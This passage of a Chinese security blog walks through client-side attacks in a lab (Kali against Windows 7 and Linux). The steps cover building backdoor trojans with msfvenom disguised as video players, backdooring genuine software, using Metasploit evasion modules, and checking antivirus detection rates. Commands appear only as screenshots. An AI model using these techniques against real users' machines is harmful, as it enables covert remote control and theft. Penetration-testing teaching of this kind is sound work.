<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105925383.png" alt="image-20210818105925383"></p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818105957052.png" alt="image-20210818105957052"></p>
<p>步骤3：效果</p>
<p>目标机打开文件</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110059162.png" alt="image-20210818110059162"></p>
<p>攻击者</p>
<p><img src="/2021/08/18/%E5%88%A9%E7%94%A8deb%E5%8C%85-0day-java%E7%8E%AF%E5%A2%83%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F/image-20210818110159404.png" alt="image-20210818110159404"></p>
<p>补充：该文件如果发到其他主机，其他主机也可能会被感染/遭受攻击</p>
<p><strong>应对方法</strong>：安装杀毒软件，杀毒软件会发出警告或杀掉木马。也可以查看宏来判断</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/" class="post-title-link" itemprop="url">客户端渗透</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-17 10:38:12 / 修改时间：10:38:54" itemprop="dateCreated datePublished" datetime="2021-08-17T10:38:12+08:00">2021-08-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h1><h2 id="一、客户端渗透原理"><a href="#一、客户端渗透原理" class="headerlink" title="一、客户端渗透原理"></a>一、客户端渗透原理</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201142972.png" alt="image-20210816201142972"></p>
<h2 id="二、制作Windows恶意软件获取shell"><a href="#二、制作Windows恶意软件获取shell" class="headerlink" title="二、制作Windows恶意软件获取shell"></a>二、制作Windows恶意软件获取shell</h2><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201337098.png" alt="image-20210816201337098"></p>
<h3 id="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"><a href="#实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马" class="headerlink" title="实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马"></a>实战1：使用msfvenom生成快播或西瓜影音看片神器后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201528885.png" alt="image-20210816201528885"></p>
<h3 id="2-1生成西瓜影音-exe后门程序"><a href="#2-1生成西瓜影音-exe后门程序" class="headerlink" title="2.1生成西瓜影音.exe后门程序"></a>2.1生成西瓜影音.exe后门程序</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201708965.png" alt="image-20210816201708965"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201745558.png" alt="image-20210816201745558"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201820472.png" alt="image-20210816201820472"></p>
<p>环境：kali、win7（靶机）</p>
<h4 id="步骤1：生成后门程序并启动服务器"><a href="#步骤1：生成后门程序并启动服务器" class="headerlink" title="步骤1：生成后门程序并启动服务器"></a>步骤1：生成后门程序并启动服务器</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816201959791.png" alt="image-20210816201959791"></p>
<h4 id="步骤2：在MSF上启动handler开始监听后门程序"><a href="#步骤2：在MSF上启动handler开始监听后门程序" class="headerlink" title="步骤2：在MSF上启动handler开始监听后门程序"></a>步骤2：在MSF上启动handler开始监听后门程序</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203201351.png" alt="image-20210816203201351"></p>
<p>启动msf</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203308925.png" alt="image-20210816203308925"></p>
<p>加载hander模块</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203337202.png" alt="image-20210816203337202"></p>
<p>配置payload</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203450238.png" alt="image-20210816203450238"></p>
<p>查看并配置参数、启动</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203609271.png" alt="image-20210816203609271"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203656900.png" alt="image-20210816203656900"></p>
<p>补充：启动后就在监听了</p>
<h4 id="步骤3：win7下载木马文件并运行"><a href="#步骤3：win7下载木马文件并运行" class="headerlink" title="步骤3：win7下载木马文件并运行"></a>步骤3：win7下载木马文件并运行</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202231441.png" alt="image-20210816202231441"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202251261.png" alt="image-20210816202251261"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203759663.png" alt="image-20210816203759663"></p>
<h4 id="步骤4：查看结果并提升权限"><a href="#步骤4：查看结果并提升权限" class="headerlink" title="步骤4：查看结果并提升权限"></a>步骤4：查看结果并提升权限</h4><h4 id><a href="#" class="headerlink" title></a><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816203911048.png" alt="image-20210816203911048"></h4><p>查看权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204025799.png" alt="image-20210816204025799"></p>
<p>提升权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204236941.png" alt="image-20210816204236941"></p>
<p>其他操作</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204419164.png" alt="image-20210816204419164"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204435891.png" alt="image-20210816204435891"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204609219.png" alt="image-20210816204609219"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204637881.png" alt="image-20210816204637881"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204731011.png" alt="image-20210816204731011"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816204847203.png" alt="image-20210816204847203"></p>
<p>补充：软件病毒/木马等扫描网站</p>
<p>1.可以把程序/软件会被那些杀毒软件扫描出来</p>
<p>2.可以检测自己制作的木马可以避开率</p>
<p>扫描网站1：<a target="_blank" rel="noopener" href="https://www.virscan.org/">https://www.virscan.org/</a></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202542969.png" alt="image-20210816202542969"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202732647.png" alt="image-20210816202732647"></p>
<p>扫描网站2：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816202846223.png" alt="image-20210816202846223"></p>
<h3 id="2-2模拟黑客给真正的软件加上后门"><a href="#2-2模拟黑客给真正的软件加上后门" class="headerlink" title="2.2模拟黑客给真正的软件加上后门"></a>2.2模拟黑客给真正的软件加上后门</h3><h4 id="步骤1：下载正版软件并安装上后门"><a href="#步骤1：下载正版软件并安装上后门" class="headerlink" title="步骤1：下载正版软件并安装上后门"></a>步骤1：下载正版软件并安装上后门</h4><p>下载程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205146217.png" alt="image-20210816205146217"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205214862.png" alt="image-20210816205214862"></p>
<p>查找要安装后门的程序（副程序：主程序启动会带动其启动）</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205633896.png" alt="image-20210816205633896"></p>
<h4 id="步骤2：把副程序复制到kali进行安装后门"><a href="#步骤2：把副程序复制到kali进行安装后门" class="headerlink" title="步骤2：把副程序复制到kali进行安装后门"></a>步骤2：把副程序复制到kali进行安装后门</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205914655.png" alt="image-20210816205914655"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816205939315.png" alt="image-20210816205939315"></p>
<p>安装后门</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210009776.png" alt="image-20210816210009776"></p>
<p>win7下载安装了后门的程序并替换正版的程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210157882.png" alt="image-20210816210157882"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210214266.png" alt="image-20210816210214266"></p>
<p>步骤3：启动</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210303111.png" alt="image-20210816210303111"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210315008.png" alt="image-20210816210315008"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210349331.png" alt="image-20210816210349331"></p>
<p>回到win7启动软件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210438619.png" alt="image-20210816210438619"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210512609.png" alt="image-20210816210512609"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210616482.png" alt="image-20210816210616482"></p>
<h3 id="2-3-使用metasploit的evasion模块生成后门木马"><a href="#2-3-使用metasploit的evasion模块生成后门木马" class="headerlink" title="2.3 使用metasploit的evasion模块生成后门木马"></a>2.3 使用metasploit的evasion模块生成后门木马</h3><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210719911.png" alt="image-20210816210719911"></p>
<h4 id="步骤1：查找并加载模块"><a href="#步骤1：查找并加载模块" class="headerlink" title="步骤1：查找并加载模块"></a>步骤1：查找并加载模块</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210803467.png" alt="image-20210816210803467"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210832486.png" alt="image-20210816210832486"></p>
<h4 id="步骤2：修改木马文件名称（可以不修改）"><a href="#步骤2：修改木马文件名称（可以不修改）" class="headerlink" title="步骤2：修改木马文件名称（可以不修改）"></a>步骤2：修改木马文件名称（可以不修改）</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816210936108.png" alt="image-20210816210936108"></p>
<h4 id="步骤3：设置payload"><a href="#步骤3：设置payload" class="headerlink" title="步骤3：设置payload"></a>步骤3：设置payload</h4><p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211013243.png" alt="image-20210816211013243"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211051718.png" alt="image-20210816211051718"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211129141.png" alt="image-20210816211129141"></p>
<p>启动生成文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211209466.png" alt="image-20210816211209466"></p>
<p>补充：上传文件，方便win7下载（也可以直接复制）</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211330054.png" alt="image-20210816211330054"></p>
<h4 id="步骤4：监听"><a href="#步骤4：监听" class="headerlink" title="步骤4：监听"></a>步骤4：监听</h4><p>渗透：加载模块、配置参数</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211521609.png" alt="image-20210816211521609"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211559689.png" alt="image-20210816211559689"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211611575.png" alt="image-20210816211611575"></p>
<h4 id="步骤5：win7启动木马文件"><a href="#步骤5：win7启动木马文件" class="headerlink" title="步骤5：win7启动木马文件"></a>步骤5：win7启动木马文件</h4><p>下载文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211648937.png" alt="image-20210816211648937"></p>
<p>启动木马文件</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211730407.png" alt="image-20210816211730407"></p>
<p>kali查看结果</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210816211810550.png" alt="image-20210816211810550"></p>
<h2 id="三、制作Linux恶意软件获取shell"><a href="#三、制作Linux恶意软件获取shell" class="headerlink" title="三、制作Linux恶意软件获取shell"></a>三、制作Linux恶意软件获取shell</h2><p><strong>步骤1：使用msfvenom生成linux可执行文件，再开启apache服务</strong></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102634654.png" alt="image-20210817102634654"></p>
<p>补充：这里的恶意文件是放在根目录下的，所以linux下载直接是ip地址+</p>
<p><strong>步骤2：linux系统下载恶意文件</strong></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817102923861.png" alt="image-20210817102923861"></p>
<p>此时文件是不可执行的，所以要提升权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103147429.png" alt="image-20210817103147429"></p>
<p>步骤3：设置linux的payload并</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103256476.png" alt="image-20210817103256476"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103309884.png" alt="image-20210817103309884"></p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103341812.png" alt="image-20210817103341812"></p>
<p>步骤4：linux启动程序</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103420606.png" alt="image-20210817103420606"></p>
<p>步骤5：查看结果与操作</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103501914.png" alt="image-20210817103501914"></p>
<p>查看当前目录</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103601631.png" alt="image-20210817103601631"></p>
<p>查看身份权限</p>
<p><img src="/2021/08/17/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20210817103644708.png" alt="image-20210817103644708"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">北极星上的稻草人</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">59</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">22</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">北极星上的稻草人</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<!-- 页面动态背景 -->

<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>


</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>